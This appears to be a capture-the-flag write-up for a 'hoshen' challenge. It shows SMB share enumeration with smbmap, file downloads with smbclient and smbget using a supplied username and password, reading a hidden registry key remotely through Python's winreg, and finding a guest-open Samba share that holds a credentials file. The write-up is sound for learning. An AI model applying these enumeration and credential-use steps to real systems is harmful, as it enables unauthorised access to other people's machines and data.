# Disk Permissions and Comments

The following table summarizes the disk, permissions, and comments for the specified directories and files:

| Disk | Permissions | Comment |
|------|-------------|---------|
| ADMIN$ | NO ACCESS | Remote Admin |
| C$ | NO ACCESS | Default share |
| D$ | NO ACCESS | Default share |

## File Listings
- **File Permissions and Details:**
  - `InitShutdown` (3 Mon Jan 1 02:20:54 1601)
  - `lsass` (4 Mon Jan 1 02:20:54 1601)
  - `ntsvcs` (4 Mon Jan 1 022:0:54 1601)
  - `scerpc` (3 Mon Jan 1 02:20:54 1601)
  - `Winsock2\CatalogChangeListener-2cc-0` (1 Mon Jan 1 02:20:54 1601)
  - `epmapper` (3 Mon Jan 1 02:20:54 1601)
  - `Winsock2\CatalogChangeListener-3c4-0` (1 Mon Jan 1 02:20:54 1601)
  - `Winsock2\CatalogChangeListener-23c-0` (1 Mon Jan 1 02:20:54 1601)
  - `LSM_API_service` (3 Mon Jan 1 02:20:54 1601)
  - `atsvc` (3 Mon Jan 1 02:20:54 1601)
  - `eventlog` (4 Mon Jan 1 02:20:54 1601)
  - `Winsock2\CatalogChangeListener-560-0` (1 Mon Jan 1 02:20:54 1601)
  - `Winsock2\CatalogChangeListener-498-0` (1 Mon Jan 1 02:20:54 1601)
  - `TermSrv_API_service` (3 Mon Jan 1 02:20:54 1601)
  - `Ctx_WinStation_API_service` (3 Mon Jan 1 02:20:54 1601)
  - `wkssvc` (4 Mon Jan 1 02:20:54 1601)
  - `SessEnvPublicRpc` (3 Mon Jan 1 02:20:54 1601)
  - `Winsock2\CatalogChangeListener-994-0` (1 Mon Jan 1 02:20:54 1601)
  - `spoolss` (4 Mon Jan 1 02:20:54 1601)
  - `Winsock2\CatalogChangeListener-bc8-0` (1 Mon Jan 1 02:20:54 1601)
  - `trkwks` (3 Mon Jan 1 02:20:54 1601)
  - `W32TIME_ALT` (3 Mon Jan 1 02:20:54 1601)
  - `srvsvc` (4 Mon Jan 1 02:20:54 1601)
  - `Winsock2\CatalogChangeListener-2ac-0` (1 Mon Jan 1 02:20:54 1601)
  - `PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER` (1 Mon Jan 1 02:20:54 1601)
  - `browser` (3 Mon Jan 1 02:20:54 1601)
  - `MsFteWds` (10 Mon Jan 1 02:20:54 1601)
  - `SearchTextHarvester` (1 Mon Jan 1 02:20:54 1601)
  - `AppContracts_xF9E1217A-501D-40BA-B3BE-E70F728FC295y` (1 Mon Jan 1 02:20:54 1601)
  - `winreg` (4 Mon Jan 1 02:20:54 1601)

- **IPC$**:
  - READ ONLY
  - Remote IPC

- **Directory Listings:**
  - `.idlerc` (Thu Feb 6 23:36:52 2020)
  - `3D Objects` (Wed Jan 15 14:58:31 2020)
  - `AppData` (Tue Jan 14 11:31:44 2020)
  - `Application Data` (Tue Jan 14 11:31:43 2020)
  - `Contacts` (Wed Jan 15 14:58:36 2020)
  - `Cookies` (Tue Jan 14 11:31:43 2020)
  - `Desktop` (Wed Jan 15 14:58:36 2020)
  - `Documents` (Wed Jan 15 14:58:36 2020)
  - `Downloads` (Wed Feb 5 17:29:40 2020)
  - `Favorites` (Wed Jan 15 14:58:36 2020)
  - `Links` (Wed Jan 15 14:58:36 2020)
  - `Local Settings` (Tue Jan 14 11:31:43 2020)
  - `MicrosoftEdgeBackups` (Fri Feb 7 18:25:33 2020)
  - `Music` (Wed Jan 15 14:58:36 2020)
  - `My Documents` (Tue Jan 14 11:31:43 2020)
  - `NetHood` (Tue Jan 14 11:31:43 2020)
  - `NTUSER.DAT` (1310720 Thu Feb 6 23:35:39 2020)
  - `ntuser.dat.LOG1` (327680 Fri Feb 7 20:58:37 2020)
  - `ntuser.dat.LOG2` (342016 Tue Jan 14 11:31:43 2020)
  - `NTUSER.DAT{e2cb19a2-1713-11ea-956e-c0bcf8f5979b}.TM.blf` (65536 Fri Feb 7 21:01:10 2020)
  - `NTUSER.DAT{e2cb19a2-1713-11ea-956e-c0bcf8f5979b}.TMContainer00000000000000000001.regtrans-ms` (524288 Fri Feb 7 18:16:13 2020)
  - `NTUSER.DAT{e2cb19a2-1713-11ea-956e-c0bcf8f5979b}.TMContainer00000000000000000002.regtrans-ms` (524288 Fri Feb 7 21:00:40 2020)
  - `ntuser.ini` (20 Sat Feb 8 02:17:41 2020)
  - `OneDrive` (dw--w--w-- 0 Sat Feb 8 17:40:06 2020)
  - `Pictures` (dr--r--r-- 0 Wed Jan 15 14:58:36 2020)
  - `PrintHood` (dr--r--r-- 0 Tue Jan 14 11:31:43 2020)
  - `Recent` (dr--r--r-- 0 Sat Feb 8 16:44:20 2020)
  - `Saved Games` (dr--r--r-- 0 Wed Jan 15 14:58:36 2020)
  - `Searches` (dr--r--r-- 0 Sat Feb 8 21:00:09 2020)
  - `SendTo` (dr--r--r-- 0 Tue Jan 14 11:31:43 2020)
  - `Start Menu` (dr--r--r-- 0 Tue Jan 14 11:31:43 2020)
  - `Templates` (dr--r--r-- 0 Tue Jan 14 11:31:43 2020)
  - `Videos` (dr--r--r-- 0 Wed Jan 15 14:58:36 2020)

- **User Access:**
  - `user07`: READ ONLY

## Accessing the Disk

The user has read-only access to `IPC$` and `user07`. We will start by accessing the disk:

```console
root@kali:/media/sf_CTFs/hoshen/1# smbclient //13.89.33.39/user07 -U user07%ClngP@ss -m SMB2 -t 120
Try "help" to get a list of possible commands.
smb: \> cd Downloads
smb: \Downloads\> dir
  .                                   D        0  Wed Feb  5 17:29:40 2020
  ..                                  D        0  Wed Feb  5 17:29:40 2020
  Challenge2.pcap.rar                 A 82637414  Wed Jan 29 17:03:49 2020
  classified_document.txt             A       44  Wed Jan 29 17:11:21 2020
  desktop.ini                       AHS      282  Tue Jan 14 11:31:50 2020
                33147387 blocks of size 4096. 27683659 blocks available
smb: \Downloads\> get classified_document.txt
getting file \Downloads\classified_document.txt of size 44 as classified_document.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Downloads\> get Challenge2.pcap.rar
parallel_read returned NT_STATUS_IO_TIMEOUT
smb: \Downloads\> getting file \Downloads\Challenge2.pcap.rar of size 82637414 as Challenge2.pcap.rar SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now
```

We were able to download `classified_document.txt`, but the server connection was problematic, and reading the 80MB RAR file kept failing. Let's use `smbget` instead, as it supports resuming:

```console
root@kali:/media/sf_CTFs/hoshen/1# smbget -U user07 -D smb://13.89.33.39/user07/Downloads/Challenge2.pcap.rar
Password for [user07] connecting to //user07/13.89.33.39:
Using workgroup WORKGROUP, user user07
................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................Can't read 64000 bytes at offset 35840000, file smb://13.89.33.39/user07/Downloads/Challenge2.pcap.rar
root@kali:/media/sf_CTFs/hoshen/1# smbget -U user07 -D -r smb://13.89.33.39/user07/Downloads/Challenge2.pcap.rar
Password for [user07] connecting to //user07/13.89.33.39:
Using workgroup WORKGROUP, user user07
............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
smb://13.89.33.39/user07/Downloads/Challenge2.pcap.rar downloaded
Downloaded 44.63MB in 254 seconds
```

Now we have two files. The first one is a base64-encoded binary file:

```console
root@kali:/media/sf_CTFs/hoshen/1# cat classified_document.txt
W2xAjCIruqj4DEsNDIGlztmL7AcXHSySQA3EBGS1zNw=
root@kali:/media/sf_CTFs/hoshen/1# cat classified_document.txt | base64 -d | xxd -g 1
00000000: 5b 6c 40 8c 22 2b ba a8 f8 0c 4b 0d 0c 81 a5 ce  [l@."+....K.....
00000010: d9 8b ec 07 17 1d 2c 92 40 0d c4 04 64 b5 cc dc  ......,.@...d...
```

The second is a password-protected RAR archive:

```console
root@kali:/media/sf_CTFs/hoshen/1# unrar l Challenge2.pcap.rar
UNRAR 5.50 freeware      Copyright (c) 1993-2017 Alexander Roshal
Archive: Challenge2.pcap.rar
Details: RAR 5
 Attributes      Size     Date    Time   Name
----------- ---------  ---------- -----  ----
*   ..A.... 152151936  2020-01-30 02:22  Challenge2.pcapng
----------- ---------  ---------- -----  ----
            152151936                    1
root@kali:/media/sf_CTFs/hoshen/1# unrar t Challenge2.pcap.rar
UNRAR 5.50 freeware      Copyright (c) 1993-2017 Alexander Roshal
Testing archive Challenge2.pcap.rar
Enter password (will not be echoed) for Challenge2.pcapng:
```

## Remote Registry Access

Notice this line from the `smbmap` output:

```
fr--r--r--                4 Mon Jan  1 02:20:54 1601    winreg
IPC$                                                    READ ONLY       Remote IPC
```

It means that the user can remotely access the registry. For example, using Python:

```python
Python 3.7.3 (v3.7.3:ef4ec6ed12, Mar 25 2019, 21:26:53) [MSC v.1916 32 bit (Intel)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> from winreg import *
>>> root = ConnectRegistry(r"\\13.89.33.39", HKEY_USERS)
>>> key = OpenKeyEx(root, r"S-1-5-18\Software\Microsoft\CTF\HiddenKey")
>>> EnumValue(key, 0)
('DecryptionKey', 'SzBsSGFLM2Y=', 1)
```

Or, using `regedit.exe` -> `File` -> `Connect Network Registry` -> `13.89.33.39`:

![](images/reg.png)

## Samba: 104.43.243.221

Let's move on to the next IP we found in the logs: `104.43.243.221`.

```console
root@kali:/media/sf_CTFs/hoshen/1# smbmap -H 104.43.243.221
[+] Finding open SMB ports....
[+] Guest SMB session established on 104.43.243.221...
[+] IP: 104.43.243.221:445      Name: 104.43.243.221
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        share                                                   NO ACCESS       Samba on Ubuntu
        sharenopass                                             NO ACCESS
        .
        dr--r--r--                0 Sun Jan 19 11:12:30 2020    .
        dr--r--r--                0 Mon Jan 20 19:50:22 2020    ..
        fr--r--r--               38 Sun Jan 19 11:12:30 2020    credenitals.txt
        Creds                                                   READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (HoshenCtf2 server (Samba, Ubuntu))
```

Looks like there's an open share here which doesn't require a password:

```console
root@kali:/media/sf_CTFs/hoshen/1# smbclient //104.43.243.221/Creds
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jan 19 11:12:30 2020
  ..                                  D        0  Mon Jan 20 19:50:22 2020
  credenitals.txt                     N       38  Sun Jan 19 11:12:30 2020
                30309264 blocks of size 1024. 26883336 blocks available
```